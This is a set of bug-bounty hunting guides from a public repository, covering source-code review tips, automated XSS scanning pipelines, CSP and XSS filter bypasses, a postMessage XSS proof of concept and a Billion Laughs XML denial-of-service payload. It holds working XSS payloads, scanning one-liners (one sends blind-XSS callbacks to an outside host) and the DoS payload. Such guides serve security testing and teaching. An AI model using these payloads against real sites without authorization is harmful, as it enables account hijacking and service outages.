{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Web_Source_Review/codereviewtips.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Web_Source_Review/codereviewtips.md", "content": "# Code review:-\n\nby performing source code review we can find some web application vulnerabilities\n\n\n### 1.Important functions first\n------------------------------------\nWhen reading source code, \nfocus on important functions such as authentication, password reset, state-changing actions and sensitive info reads. \n(What is the most important would depend on the application.) \nThen, review how these components interact with other functionality.\n Finally, audit other less sensitive parts of the application.\n\n### 2.Follow user input\n------------------------------\n\nAnother approach is to follow the code that processes user input. \nUser input such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and \nfile uploads provide the entry points for attackers to exploit the application’s vulnerabilities.This may also help us to\nfind some critical vulnerabilities like xxe,xxs,sql injection\n\n### 3.Hardcoded secrets and credentials: \n-------------------------------------------------------\nHardcoded secrets such as API keys, encryption keys and database passwords can be easily discovered during a \nsource code review. You can grep for keywords such as “key”, “secret”, “password”, “encrypt” or regex search \nfor hex or base64 strings (depending on the key format in use).\n\n### 4.Use of dangerous functions and outdated dependencies: \n----------------------------------------------------------------------------------\nUnchecked use of dangerous functions and outdated dependencies are a huge source of bugs.\n Grep for specific functions for the language you are using and search through the dependency versions list to \nsee if they are outdated.\n\n### 5.Developer comments, hidden debug functionalities, configuration files, and the .git directory:\n-----------------------------------------------------------------------------------------------------------------------\n These are things that developers often forget about and they leave the application in a dangerous state. \nDeveloper comments can point out obvious programming mistakes, hidden debug functionalities often lead to\n privilege escalation, config files allow attackers to gather more information about your infrastructure and finally, \nan exposed .git directory allows attackers to reconstruct your source code.\n\n### 6.Hidden paths, deprecated endpoints, and endpoints in development:\n-----------------------------------------------------------------------------------------------------\n These are endpoints that users might not encounter when using the application normally. But if they work and \nthey are discovered by an attacker, it can lead to vulnerabilities such as authentication bypass and sensitive \ninformation leak, depending on the exposed endpoint.\n\n\n\n### 7.Weak cryptography or hashing algorithms: \n-----------------------------------------------------------------------------------------------------------------------\nThis is an issue that is hard to find during a black-box test, but easy to spot when reviewing source code. \nLook for issues such as weak encryption keys, breakable encryption algorithms, and weak hashing algorithms. \nGrep for terms like ECB, MD4, and MD5.\n\n### 8.Missing security checks on user input and regex strength:\n-----------------------------------------------------------------------------------------------------\nReviewing source code is a great way to find out what kind of security checks are missing. \nRead through the application’s documentation and test all the edge cases that you can think of. \nA great resource for what kind of edge cases that you should consider is PayloadsAllTheThings.(github)\n\n### 9.Missing cookie flags:\n----------------------------------------------------------------- \nLook out for missing cookie flags such as httpOnly and secure.\n\n\n### 10.Unexpected behavior, conditionals, unnecessarily complex and verbose  functions: \n--------------------------------------------------------------------------------------------------------------------\nAdditionally, pay special attention to the application’s unexpected behavior, conditionals, and complex functions. \nThese locations are where obscure bugs are often discovered.\n\n### Authors\n* [@harsha0x01](https://twitter.com/harsha0x01)\n", "timestamp": "2025-10-21T22:02:24.910135"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XSS/Automated_XSS.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XSS/Automated_XSS.md", "content": "# Automating XSS Detection Using Dalfox, WaybackURLs, and GF Patterns\n\n## Prerequisites: Installing Go on Your Machine\n\nBefore proceeding, ensure that **Go** is installed on your system. You can install it using the following commands:\n\n```bash\nsudo apt install -y golang\nexport GOROOT=/usr/lib/go\nexport GOPATH=$HOME/go\nexport PATH=$GOPATH/bin:$GOROOT/bin:$PATH\nsource .bashrc\n```\n\n---\n\n## Hunting Blind XSS Using Dalfox\n\nTo detect blind XSS vulnerabilities, follow these steps:\n\n1. Use **WaybackURLs** to extract URLs for the target.\n2. Use **GF patterns** to identify possible XSS-vulnerable parameters.\n3. Utilize **Dalfox** to detect XSS.\n\n### Execution Command:\n```bash\nwaybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && \\\ncat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt\n```\n\n---\n\n## Hunting Reflected XSS\n\nTo identify reflected XSS vulnerabilities, follow these steps:\n\n1. Extract URLs using **WaybackURLs**.\n2. Use **qsreplace** to inject payloads and analyze responses.\n\n### Execution Command:\n```bash\nwaybackurls testphp.vulnweb.com | grep '=' | qsreplace '\"><script>alert(1)</script>' | \\\nwhile read host; do\n    curl -s --path-as-is --insecure \"$host\" | grep -qs \"<script>alert(1)</script>\" && \\\n    echo \"$host \\033[0;31m Vulnerable\"\ndone\n```\n\n---\n\n## Identifying Parameters That Do Not Filter Special Characters\n\nThe following command checks whether parameters accept special characters without proper sanitization:\n\n```bash\necho \"test.url\" | waybackurls | grep \"=\" | tee waybackurls.txt\ncat waybackurls.txt | egrep -iv \".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)\" | \\\nqsreplace '\"><()' | tee combinedfuzz.json && \\\ncat combinedfuzz.json | while read host; do\n    curl --silent --path-as-is --insecure \"$host\" | grep -qs \"\\\"><()\" && \\\n    echo -e \"$host \\033[91m Vulnerable \\e[0m \\n\" || \\\n    echo -e \"$host \\033[92m Not Vulnerable \\e[0m \\n\"\ndone | tee XSS.txt\n```\n\n---\n\n## Downloading the Required Tools\n\nThe following tools are required for this process:\n\n| Tool | GitHub Repository |\n|------|------------------|\n| **Dalfox** | [Dalfox](https://github.com/hahwul/dalfox) |\n| **WaybackURLs** | [WaybackURLs](https://github.com/tomnomnom/waybackurls) |\n| **GF** | [GF](https://github.com/tomnomnom/gf) |\n| **GF Patterns** | [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns) |\n| **qsreplace** | [qsreplace](https://github.com/tomnomnom/qsreplace) |\n\nA complete script can be found here: [QuickXSS](https://github.com/theinfosecguy/QuickXSS)\n\n---\n\n## Contact Information\n\nFor any questions or further discussions, feel free to reach out on Twitter:\n\n- [@g0t_rOoT_](https://twitter.com/g0t_rOoT_)\n- [@Fani Malik](https://twitter.com/fanimalikhack)\n- [@Faizee Asad](https://twitter.com/faizee_asad)\n- [@Prince Prafull](https://twitter.com/princeprafull3)\n\n---\n\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:25.472459"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XSS/Bypass_CSP.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XSS/Bypass_CSP.md", "content": "# Content Security Policy (CSP)\n\n## What is CSP?\n\nContent Security Policy (CSP) is a security mechanism that defines which resources can be fetched or executed by a web page. It acts as a security policy that controls which scripts, images, and iframes can be executed on a specific page and from which sources. CSP is implemented using response headers or meta elements within an HTML page. Once implemented, the browser enforces the policy and actively blocks any violations detected.\n\n---\n\n## How Does CSP Work?\n\nCSP works by restricting the sources from which active and passive content can be loaded. Additionally, it enforces security policies such as preventing the execution of inline JavaScript, disabling the use of `eval()`, and limiting resource loading to specific origins.\n\n---\n\n## Defining CSP Rules\n\nThe following example illustrates a CSP configuration:\n\n```plaintext\ndefault-src 'none';\nimg-src 'self';\nscript-src 'self' https://code.jquery.com;\nstyle-src 'self';\nreport-uri /__cspreport__;\nfont-src 'self' https://addons.cdn.mozilla.net;\nframe-src 'self' https://ic.paypal.com https://paypal.com;\nmedia-src https://videos.cdn.mozilla.net;\nobject-src 'none';\n```\n\n---\n\n## Key CSP Directives\n\nBelow are some important CSP directives and their functions:\n\n1. **script-src:** Defines allowed sources for JavaScript execution, including inline scripts and external script files.\n2. **default-src:** Sets the default policy for resource loading when specific fetch directives are not defined.\n3. **child-src:** Controls allowed sources for web workers and embedded frames.\n4. **connect-src:** Restricts URLs used in interfaces such as `fetch`, `WebSocket`, and `XMLHttpRequest`.\n5. **frame-src:** Defines allowed sources for `<frame>` and `<iframe>` elements.\n6. **frame-ancestors:** Specifies which sources can embed the current page in `<frame>`, `<iframe>`, `<object>`, or `<embed>` elements.\n7. **img-src:** Defines allowed sources for loading images.\n8. **manifest-src:** Specifies allowed sources for application manifest files.\n9. **media-src:** Defines sources for loading media files such as audio and video.\n10. **object-src:** Restricts the sources for `<object>`, `<embed>`, and `<applet>` elements.\n11. **base-uri:** Specifies allowed base URLs that can be loaded using the `<base>` element.\n12. **form-action:** Lists valid endpoints for form submissions using `<form>` elements.\n13. **plugin-types:** Restricts the MIME types of plugins that can be invoked.\n14. **sandbox:** Applies various security restrictions on loaded resources, such as preventing pop-ups, restricting script execution, and enforcing the same-origin policy.\n15. **upgrade-insecure-requests:** Instructs browsers to upgrade HTTP requests to HTTPS.\n\n---\n\n## CSP Bypass Techniques\n\n### 1. CSP Misconfiguration\n\nOne of the most common reasons for CSP bypass is the use of insecure values in policy definitions. Consider the following CSP header:\n\n```plaintext\ndefault-src 'self' *;\n```\n\n- The `default-src` directive acts as a fallback policy for all fetch directives.\n- The wildcard `*` allows loading resources from any source.\n- This effectively nullifies the security benefits of CSP.\n\nAnother example:\n\n```plaintext\nscript-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;\n```\n\n- The `script-src` directive allows JavaScript execution from the specified sources.\n- The presence of `'unsafe-inline'` permits inline JavaScript execution, which can lead to Cross-Site Scripting (XSS).\n- The presence of `data:` allows loading JavaScript from `data:` URLs, making it easier for attackers to inject malicious scripts.\n\nExample exploit:\n\n```html\n<iframe src=\"data:text/html,<svg onload=alert(1)>\"></iframe>\n```\n\n---\n\n### 2. JSONP-Based CSP Bypass\n\nJSONP (JSON with Padding) is a technique used to bypass the Same-Origin Policy (SOP) by injecting JavaScript payloads into API responses. If a JSONP endpoint is included in the `script-src` policy, it can be exploited to inject malicious scripts.\n\nExample JSONP endpoint:\n\n```plaintext\nhttps://accounts.google.com/o/oauth2/revoke?callback=alert(1337)\n```\n\nIf a CSP policy includes `accounts.google.com` in the `script-src` directive, an attacker can exploit it as follows:\n\n```plaintext\nsomething.example.com?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)\n```\n\nThis allows JavaScript execution from an external source, effectively bypassing CSP.\n\n---\n\n### 3. CSP Injection\n\nCSP injection occurs when user-controlled input is reflected in the CSP header. Consider the following vulnerable URL:\n\n```plaintext\nexample.com?vuln=something_vuln_csp\n```\n\nIf the value of `vuln` is directly inserted into the CSP header, an attacker can manipulate the policy:\n\n```plaintext\nscript-src something_vuln_csp;\nobject-src 'none';\nbase-uri 'none';\nrequire-trusted-types-for 'script';\nreport-uri https://csp.example.com;\n```\n\nBy modifying the `script-src` directive, an attacker can include a malicious domain, allowing external JavaScript execution.\n\n---\n\n## Author\n\nFor further information or discussions, feel free to reach out to:\n\n- **[@harsha0x01](https://twitter.com/harsha0x01)**\n\n---\n\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:25.575930"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XSS/XSS_Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XSS/XSS_Bypass.md", "content": "# XSS Filter Bypass Techniques\n\n## Introduction\n\nFor those new to Cross-Site Scripting (XSS) attacks, it is essential to first understand the fundamental concepts before exploring filter bypass techniques.\n\n---\n\n## Alternatives to `alert()`\n\nMany web applications block the `alert()` function to mitigate XSS attacks. Below are alternative functions that can be used:\n\n- **`confirm()`** instead of `alert()`\n- **`prompt()`** instead of `alert()`\n- **`console.log()`** instead of `alert()`\n- **`eval()`** instead of `alert()`\n\n---\n\n## Alternatives to the `onerror` Event Handler\n\nIf the `onerror` event handler is blocked, the following alternatives can be used to trigger JavaScript execution:\n\n- **`onload`**\n- **`onfocus`**\n- **`onmouseover`**\n- **`onblur`**\n- **`onclick`**\n- **`onscroll`**\n\nThese event handlers can be embedded within HTML elements to execute scripts when the event is triggered.\n\n---\n\n## Handling Parentheses Filtering\n\nIf parentheses `()` are filtered, backticks `` ` ` `` can be used as an alternative. Examples:\n\n```html\n<script>alert`1`</script>\n<img src=x onerror=alert`1`>\n<img src=x onerror=prompt`1`>\njavascript:prompt`1`\njavascript:alert`1`\n```\n\nThis method is effective against weak input sanitization mechanisms that only block standard function calls enclosed in parentheses.\n\n---\n\n## Additional Resources\n\nFor further learning and reference, the following resources provide comprehensive details on XSS filter evasion techniques:\n\n1. **PortSwigger XSS Cheat Sheet** - [Visit PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n2. **OWASP XSS Filter Evasion Cheat Sheet** - [Visit OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\n\n---\n\n## Contact Information\n\nFor discussions and insights, you can connect with:\n\n- **[@Fani Malik](https://twitter.com/fanimalikhack/)**\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:25.676531"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XSS/Xss.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XSS/Xss.md", "content": "# **Comprehensive Guide to XSS Exploitation Techniques and Bypasses**\n\n## **1. Reflected XSS Methods**\nReflected XSS attacks exploit vulnerabilities where user input is included in the response without proper sanitization. Below are some common approaches.\n\n### **Mind Map for Reflected XSS**\nAn extensive mind map detailing approaches to reflected XSS can be found here:  \n**[Reflected XSS Mindmap](https://github.com/A9HORA/Reflected-XSS-Mindmap)** by **[@A9HORA](https://twitter.com/A9HORA)**.\n\n### **1.1 Using Burp Suite**\n1. Install the **Reflection** and **Sentinel** plugins for Burp Suite.\n2. Walk and spider the target site.\n3. Inspect the **reflected parameters** tab in Burp.\n4. Send parameters to **Sentinel** for automated analysis or verify manually.\n\n### **1.2 Using WaybackURLs and Similar Tools**\n1. Use **[Gau](https://github.com/lc/gau)** or **[WaybackURLs](https://github.com/tomnomnom/waybackurls)** to collect URLs.\n2. Filter parameters using `grep \"=\"` or **GF patterns** and store them in a file.\n3. Run **[Gxss](https://github.com/KathanP19/Gxss)** or **[Bxss](https://github.com/ethicalhackingplayground/bxss/)** on the file.\n4. Manually inspect reflected parameters or use **[Dalfox](https://github.com/hahwul/dalfox)**.\n\n### **1.3 Using Google Dorks**\n1. Use Google Dork: `site:target.com`\n2. Find links with parameters using dorks such as:\n   - `site:target.com inurl:\".php?\"`\n   - `site:target.com filetype:php`\n   - **More dorks:** [Top 100 XSS Dorks](https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/)\n3. Check if parameters are reflected in HTML.\n4. Inject XSS payloads or test with automated tools.\n\n### **1.4 Finding Hidden Variables in Source Code**\n1. Inspect JavaScript and HTML source files for hidden parameters.\n2. Search manually in **Page Source** for:\n   - `var=`\n   - `=\"\"`\n   - `=''`\n3. Append discovered parameters to URLs, e.g.,  \n   `https://example.com?hiddenvariablename=xss`\n\n### **1.5 Other Techniques**\n1. Use **Methods 1 or 2** to gather URLs.\n2. Identify the **firewall** using [WhatWaf](https://github.com/Ekultek/WhatWaf).\n3. Find WAF bypass payloads:\n   - Twitter search\n   - [Awesome WAF Bypass](https://github.com/0xInfection/Awesome-WAF)\n4. Use **[Arjun](https://github.com/s0md3v/Arjun)** to discover hidden parameters.\n\n### **Additional Tips**\n- Examine **error pages (404, 403, etc.)** for reflected values.\n- Trigger a **403 error** by requesting the `.htaccess` file.\n- Test **all reflected parameters** for XSS.\n\n### **Video References**\n- [Reflected XSS Automation](https://www.youtube.com/watch?v=wuyAY3vvd9s)\n- [Practical XSS Hunting](https://www.youtube.com/watch?v=GsyOuQBG2yM)\n\n---\n\n## **2. Stored XSS Methods**\nStored XSS occurs when malicious scripts are permanently stored on the target website.\n\n### **Steps for Detecting Stored XSS**\n1. Enumerate the firewall and identify WAF rules.\n2. Test payloads in fields such as:\n   - **Username**\n   - **Address**\n   - **Email**\n3. Inject payloads in **profile picture filenames** and metadata.\n4. Attempt injections in **comments, reviews, and feedback sections**.\n5. Try **every input field** that reflects data to other users.\n6. Register an account with an XSS payload in the **name field**.\n\n### **Additional Tips**\n- Test entity injection with:\n  ```html\n  <a href=#>test</a>\n  ```\n- If any payload is executed, refine and escalate the attack.\n\n### **Write-Up Reference**\n- [How I Found My First Stored XSS](https://medium.com/@fatin151485/how-i-found-my-first-stored-xss-on-popular-eboighar-com-6bd497b0bb96)\n\n---\n\n## **3. Blind XSS**\nBlind XSS occurs when the payload does not immediately reflect, but executes later in backend systems or admin panels.\n\n### **Detection Techniques**\n1. Inject payloads that call back to a **listener** on your server.\n2. Use:\n   - **[XSS Hunter](https://xsshunter.com/)**\n   - **Burp Collaborator**\n   - **Ngrok** for receiving callbacks.\n3. Test injection points such as:\n   - **Contact forms**\n   - **Admin dashboards**\n   - **User input logs**\n   - **E-commerce checkout fields**\n\n### **Common Injection Points**\n- **Review and feedback forms**\n- **Address fields in e-commerce sites**\n- **User-Agent headers**\n- **Log viewers**\n- **Chat applications**\n- **Moderation panels**\n\n### **Video References**\n- [Blind XSS Hunting](https://www.youtube.com/watch?v=uHy1x1NkwRU)\n\n---\n\n## **4. DOM-Based XSS**\nDOM XSS occurs when JavaScript dynamically manipulates the page without sanitizing user input.\n\n### **Tips**\n- Manual detection is difficult; use tools like:\n  - **Burp Suite PRO**\n  - **[RA2 DOM XSS Scanner](https://github.com/dpnishant/ra2-dom-xss-scanner)**\n\n### **Video References**\n- [Understanding DOM XSS](https://www.youtube.com/watch?v=gBqzzhgHoYg)\n\n---\n\n## **5. XSS Filter Evasion Techniques**\n### **General Bypass Techniques**\n- Replace `<` and `>` with **HTML entities**:\n  ```html\n  &lt;script&gt;alert(1)&lt;/script&gt;\n  ```\n- Use **XSS polyglots**:\n  ```html\n  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n  ```\n  - [Full XSS Polyglots List](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)\n\n### **XSS Firewall Bypass**\n- **Bypass lowercase filtering**:\n  ```html\n  <scRipT>alert(1)</scRipT>\n  ```\n- **Break firewall regex using new lines**:\n  ```html\n  <script>%0alert(1)</script>\n  ```\n- **Double Encoding**:\n  ```plaintext\n  %2522\n  ```\n- **Recursive filters bypass**:\n  ```html\n  <src<script>ipt>alert(1);</scr</script>ipt>\n  ```\n- **Injecting anchor tags without whitespace**:\n  ```html\n  <a/href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;\">\n  ```\n- **Bypassing whitespace filtering using a bullet (`•`)**:\n  ```html\n  <svg•onload=alert(1)>\n  ```\n- **Changing request methods**:\n  ```\n  GET /?q=xss  \n  POST / q=xss\n  ```\n- **Injecting CRLF characters for HTTP response splitting**:\n  ```\n  GET /%0A%0DValue=%20Virus\n  ```\n\n---\n\n## **Acknowledgments and References**\n### **Special Thanks**\n- **[The XSS Rat](https://www.youtube.com/channel/UCjBhClJ59W4hfUly51i11hg)**\n- **[@sratarun](https://twitter.com/sratarun)**\n\n### **References**\n- **[Hunting Checklist](https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md)**\n\n### **Authors**\n- **[@KathanP19](https://twitter.com/KathanP19)**\n- **[@harsha0x01](https://twitter.com/harsha0x01)**\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:25.861256"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XSS/post_message_xss.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XSS/post_message_xss.md", "content": "# **PostMessage XSS (Cross-Site Scripting) Vulnerability**\n\n## **Introduction**\nThe `postMessage` API is widely used in modern web applications to enable cross-origin communication between different windows, iframes, and pop-ups. However, **if the receiving application does not properly validate the origin of incoming messages**, it may be vulnerable to **PostMessage XSS**.\n\nThis vulnerability allows attackers to send malicious data from an **untrusted source (e.g., sandboxed iframe, null origin, or malicious website)** to a trusted application, leading to **security risks such as data theft, session hijacking, and arbitrary JavaScript execution.**\n\n---\n\n## **How PostMessage Works**\nThe `window.postMessage()` function allows scripts running in one window to send messages to another window. The syntax is:\n\n```javascript\nwindow.postMessage(message, targetOrigin, [transfer]);\n```\n\n- `message`: The data to be sent to the target window.\n- `targetOrigin`: A string specifying the expected origin of the recipient (use `\"*\"` to allow any origin, which is insecure).\n- `transfer`: Optional, used for passing objects.\n\nExample of secure usage:\n```javascript\nwindow.postMessage(\"data\", \"https://trusted-site.com\");\n```\n\n---\n\n## **Vulnerability: Improper Origin Validation**\nIf an application listens for `postMessage` events **without verifying the sender’s origin**, an attacker can exploit this by crafting a malicious message from an unauthorized source.\n\n### **Example of an Insecure Implementation**\n```javascript\nwindow.addEventListener(\"message\", function (event) {\n    // No origin validation\n    document.body.innerHTML = event.data;\n});\n```\n**Security Issue:**  \n- The application directly processes any received message without verifying the sender's origin.\n- If an attacker sends a malicious payload (e.g., JavaScript injection), it can lead to XSS.\n\n### **Exploitation Scenario**\n1. The vulnerable website listens for messages using `postMessage`, but **does not check the sender’s origin**.\n2. An attacker hosts a malicious page and sends a **crafted message** to the vulnerable application.\n3. The malicious script gets executed inside the vulnerable website, leading to **DOM-based XSS**.\n\n---\n\n## **Exploiting PostMessage XSS**\n\n### **Proof of Concept (PoC)**\nThe following PoC demonstrates how an attacker can inject malicious JavaScript into a vulnerable application by exploiting a poorly validated `postMessage` request.\n\n```html\n<!doctype html>\n<html>\n<head>\n    <meta charset=\"UTF-8\" />\n    <title>PostMessage XSS PoC</title>\n    <script>\n        function pocLink() {\n            var ref = window.open('https://vulnerable-website.com'); // Open target\n            ref.postMessage(\"<img src=x onerror=alert('XSS Exploited')>\", \"https://vulnerable-website.com\");\n        }\n    </script>\n</head>\n<body>\n    <a href=\"#\" onclick=\"pocLink();\">Click to Exploit</a>          \n    <iframe src=\"https://vulnerable-website.com\" onload=\"pocFrame(this.contentWindow)\"></iframe>                    \n</body>\n</html>\n```\n\n### **Breakdown of the Attack**\n- The script opens the target **vulnerable website** in a new window (`window.open()`).\n- It **sends a malicious payload** via `postMessage()` that contains an XSS injection.\n- If the application **does not validate the message origin**, the payload executes, triggering **arbitrary JavaScript execution**.\n\n---\n\n## **Impact of PostMessage XSS**\nAn attacker exploiting this vulnerability can:\n- **Execute malicious JavaScript** on the vulnerable application.\n- **Steal sensitive data** such as session tokens, authentication credentials, or user inputs.\n- **Modify page content** or inject phishing links.\n- **Bypass Same-Origin Policy (SOP)** by controlling a trusted domain’s behavior.\n- **Perform clickjacking attacks** by embedding the site in an iframe.\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:26.050995"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "XXE/Billion_Laugh_Attack.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/XXE/Billion_Laugh_Attack.md", "content": "# Billion Laugh Attack\n- Another common vulnerability associated with XML parsing is called A Billion Laughs Attack. It uses an entity to resolve itself cyclically thereby consuming more CPU usage and causing a denial of service attack. An Example XML payload that can cause an XXE attack is as follows:\n\n```\nStep 1 : Capture the request into Burp\nStep 2 : Send it to the repeater tab and then convert the body into XML whether it is accepting or not\nStep 3 : To confirm, Check for the [ Accept ] Header change it into Application/json\nStep 4 : Covert JSON into XML if their is no Possibility\nStep 5 : Add the payload in between and change the content lol1 to lol9 depending on the dos variation in the xml field!\n```\n\n- Billion Laugh Payload :\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz> \n```\n\n## Contributor:\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\n", "timestamp": "2025-10-21T22:02:26.667629"}
